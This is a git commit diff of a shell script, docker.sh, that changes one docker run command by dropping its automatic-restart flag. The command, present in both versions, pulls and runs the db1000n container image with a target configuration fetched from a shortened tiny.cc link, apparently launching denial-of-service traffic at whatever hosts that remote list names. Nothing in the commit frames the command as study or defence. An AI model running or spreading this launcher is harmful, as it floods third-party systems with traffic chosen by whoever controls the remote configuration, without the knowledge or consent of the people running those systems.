fc26c2c1c4714b0b838b3621ec443fdbe608fbb7
andriipanchuk <59779099+andriipanchuk@users.noreply.github.com>
2022-03-07 10:40:23 -0600

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
 
-docker run -d --restart always --rm --pull always ghcr.io/arriven/db1000n ./main -c https://tiny.cc/kbull
+docker run -d --rm --pull always ghcr.io/arriven/db1000n ./main -c https://tiny.cc/kbull
 
 
